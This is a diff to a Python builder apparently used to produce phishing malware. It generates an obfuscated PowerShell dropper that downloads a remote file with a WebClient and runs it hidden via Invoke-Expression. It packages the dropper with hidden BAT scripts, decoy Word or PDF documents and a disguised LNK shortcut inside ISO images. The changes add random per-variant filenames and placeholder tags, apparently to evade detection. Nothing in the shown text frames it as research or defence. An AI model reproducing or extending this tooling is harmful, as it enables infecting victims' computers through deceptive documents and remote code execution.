@@ -117,6 +117,12 @@ def random_var_name():
     return f'{w1}{w2}{num}'
 
 
+def random_short_name():
+    """Generate a random 2-3 letter filename (lowercase)."""
+    length = random.randint(2, 3)
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+
 # ====================================================================
 #  CIPHER MAP (port of sk.ps1 cipher generation)
 # ====================================================================
@@ -152,6 +158,10 @@ def encrypt_string(text, encrypt_map):
 def generate_ps1(encrypt_map, decrypt_map):
     """Build the full PS1 artifact (dropper with cipher wrapper)."""
 
+    # ── random placeholder tags (unique per variant) ──
+    tag_url = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
+    tag_fn = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
+
     # ── random variable names for the inner template ──
     dv1 = random_var_name()  # tempPath
     dv2 = random_var_name()  # webClient
@@ -165,8 +175,8 @@ def generate_ps1(encrypt_map, decrypt_map):
         f'${dv1} = [system.io.path]::gettemppath()\n'
         f'${dv2} = new-object system.net.webclient\n'
         f'${dv2}.headers.add("x-api-key", "{API_KEY}")\n'
-        f'${dv3} = "##url-ritc##"\n'
-        f'${dv4} = "##filename-ritc##"\n'
+        f'${dv3} = "{tag_url}"\n'
+        f'${dv4} = "{tag_fn}"\n'
         f'${dv5} = join-path ${dv1} ${dv4}\n'
         f'${dv2}.downloadfile(${dv3}, ${dv5})\n'
         f'start-process -filepath ${dv5} -windowstyle hidden'
@@ -240,8 +250,8 @@ def generate_ps1(encrypt_map, decrypt_map):
         f"${var_decoded_url} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_url}))\n"
         f"${var_decoded_fn} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_filename}))\n"
         f"${var_dec_script} = {var_func} -InputString ${var_enc_body}\n"
-        f"${var_final} = ${var_dec_script} -replace '##url-ritc##', ${var_decoded_url}\n"
-        f"${var_final} = ${var_final} -replace '##filename-ritc##', ${var_decoded_fn}\n"
+        f"${var_final} = ${var_dec_script} -replace '{tag_url}', ${var_decoded_url}\n"
+        f"${var_final} = ${var_final} -replace '{tag_fn}', ${var_decoded_fn}\n"
         f"Invoke-Expression ${var_final}\n"
     )
     return artifact
@@ -609,25 +619,32 @@ def process_variant(variant_dir, output_dir):
         ps1_content = generate_ps1(enc_map, dec_map)
         print(f'      Cipher map: {len(enc_map)} chars')
 
+        # Random filenames for BAT / PS1 / decoy (unique per variant)
+        bat_name = random_short_name() + '.bat'
+        ps1_name = random_short_name() + '.ps1'
+        decoy_docx = random_short_name() + '.docx'
+        decoy_pdf = random_short_name() + '.pdf'
+        print(f'      Files: bat={bat_name}, ps1={ps1_name}, decoy={decoy_docx}/{decoy_pdf}')
+
         # ── Step 3: Build Word package ──
         print('  [*] Step 3: Build Word package...')
         word_pkg_dir = os.path.join(tmpdir, '_word_pkg')
         os.makedirs(word_pkg_dir)
 
-        # Rename first DOCX -> doc.docx (decoy, will be hidden)
-        shutil.copy2(os.path.join(tmpdir, first_docx), os.path.join(word_pkg_dir, 'doc.docx'))
+        # Rename first DOCX -> random decoy name (hidden)
+        shutil.copy2(os.path.join(tmpdir, first_docx), os.path.join(word_pkg_dir, decoy_docx))
         # Copy other DOCX files as-is (visible)
         for f in other_docx:
             shutil.copy2(os.path.join(tmpdir, f), os.path.join(word_pkg_dir, f))
 
         # Generate BAT
-        bat_content = generate_bat('doc.docx')
-        bat_path = os.path.join(word_pkg_dir, 'ik.bat')
+        bat_content = generate_bat(decoy_docx, ps1_name)
+        bat_path = os.path.join(word_pkg_dir, bat_name)
         with open(bat_path, 'w', encoding='utf-8') as f:
             f.write(bat_content)
 
         # Write PS1
-        ps1_path = os.path.join(word_pkg_dir, 'ser.ps1')
+        ps1_path = os.path.join(word_pkg_dir, ps1_name)
         with open(ps1_path, 'w', encoding='utf-8') as f:
             f.write(ps1_content)
 
@@ -637,7 +654,7 @@ def process_variant(variant_dir, output_dir):
         create_lnk(
             out_path=lnk_path,
             target='C:\\Windows\\System32\\cmd.exe',
-            arguments='/c "start /min .\\ik.bat"',
+            arguments=f'/c "start /min .\\{bat_name}"',
             icon_location='%SystemRoot%\\System32\\SHELL32.dll',
             icon_index=1,
             working_dir='.',
@@ -647,10 +664,10 @@ def process_variant(variant_dir, output_dir):
 
         # Build ISO
         iso_files = []
-        hidden_set = {'ik.bat', 'ser.ps1', 'doc.docx'}
-        iso_files.append(('ik.bat', bat_path))
-        iso_files.append(('ser.ps1', ps1_path))
-        iso_files.append(('doc.docx', os.path.join(word_pkg_dir, 'doc.docx')))
+        hidden_set = {bat_name, ps1_name, decoy_docx}
+        iso_files.append((bat_name, bat_path))
+        iso_files.append((ps1_name, ps1_path))
+        iso_files.append((decoy_docx, os.path.join(word_pkg_dir, decoy_docx)))
         iso_files.append((lnk_name, lnk_path))
         for f in other_docx:
             iso_files.append((f, os.path.join(word_pkg_dir, f)))
@@ -684,20 +701,20 @@ def process_variant(variant_dir, output_dir):
         first_pdf = pdf_map[first_docx]
         other_pdfs = [pdf_map[f] for f in other_docx]
 
-        # Rename first PDF -> doc.pdf (decoy, hidden)
-        shutil.copy2(os.path.join(pdf_convert_dir, first_pdf), os.path.join(pdf_pkg_dir, 'doc.pdf'))
+        # Rename first PDF -> random decoy name (hidden)
+        shutil.copy2(os.path.join(pdf_convert_dir, first_pdf), os.path.join(pdf_pkg_dir, decoy_pdf))
         # Copy other PDFs as-is (visible)
         for f in other_pdfs:
             shutil.copy2(os.path.join(pdf_convert_dir, f), os.path.join(pdf_pkg_dir, f))
 
-        # Generate BAT (opens doc.pdf)
-        bat_content_pdf = generate_bat('doc.pdf')
-        bat_path_pdf = os.path.join(pdf_pkg_dir, 'ik.bat')
+        # Generate BAT (opens decoy pdf) — same random bat/ps1 names
+        bat_content_pdf = generate_bat(decoy_pdf, ps1_name)
+        bat_path_pdf = os.path.join(pdf_pkg_dir, bat_name)
         with open(bat_path_pdf, 'w', encoding='utf-8') as f:
             f.write(bat_content_pdf)
 
         # Write PS1 (same dropper)
-        ps1_path_pdf = os.path.join(pdf_pkg_dir, 'ser.ps1')
+        ps1_path_pdf = os.path.join(pdf_pkg_dir, ps1_name)
         with open(ps1_path_pdf, 'w', encoding='utf-8') as f:
             f.write(ps1_content)
 
@@ -707,7 +724,7 @@ def process_variant(variant_dir, output_dir):
         create_lnk(
             out_path=lnk_path_pdf,
             target='C:\\Windows\\System32\\cmd.exe',
-            arguments='/c "start /min .\\ik.bat"',
+            arguments=f'/c "start /min .\\{bat_name}"',
             icon_location='%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe',
             icon_index=11,
             working_dir='.',
@@ -717,10 +734,10 @@ def process_variant(variant_dir, output_dir):
 
         # Build ISO
         pdf_iso_files = []
-        pdf_hidden_set = {'ik.bat', 'ser.ps1', 'doc.pdf'}
-        pdf_iso_files.append(('ik.bat', bat_path_pdf))
-        pdf_iso_files.append(('ser.ps1', ps1_path_pdf))
-        pdf_iso_files.append(('doc.pdf', os.path.join(pdf_pkg_dir, 'doc.pdf')))
+        pdf_hidden_set = {bat_name, ps1_name, decoy_pdf}
+        pdf_iso_files.append((bat_name, bat_path_pdf))
+        pdf_iso_files.append((ps1_name, ps1_path_pdf))
+        pdf_iso_files.append((decoy_pdf, os.path.join(pdf_pkg_dir, decoy_pdf)))
         pdf_iso_files.append((lnk_name_pdf, lnk_path_pdf))
         for f in other_pdfs:
             pdf_iso_files.append((f, os.path.join(pdf_pkg_dir, f)))
